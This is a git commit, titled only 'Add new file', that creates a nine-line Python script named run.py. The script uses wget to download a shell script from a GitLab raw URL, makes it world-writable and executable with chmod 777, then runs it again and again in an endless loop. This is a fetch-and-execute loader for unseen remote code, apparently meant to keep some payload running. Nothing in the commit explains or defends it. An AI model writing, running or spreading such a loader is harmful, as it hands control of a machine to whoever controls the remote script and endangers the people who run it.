f21649d6ac0a037f142ba1af83aeacefb7d46002
David uqi <ly.n.di.apar.k.er.tm.p@gmail.com>
2022-02-13 20:28:09 +0000

    Add new file

---
+++ run.py
@@ -0,0 +1,9 @@
+import sys
+import os
+from time import sleep
+os.system('wget https://gitlab.com/wahyudepan04/a/-/raw/main/0.sh')
+sleep(2)
+os.system('chmod 777 0.sh')
+sleep(2)
+while(True):
+        	os.system('./0.sh')
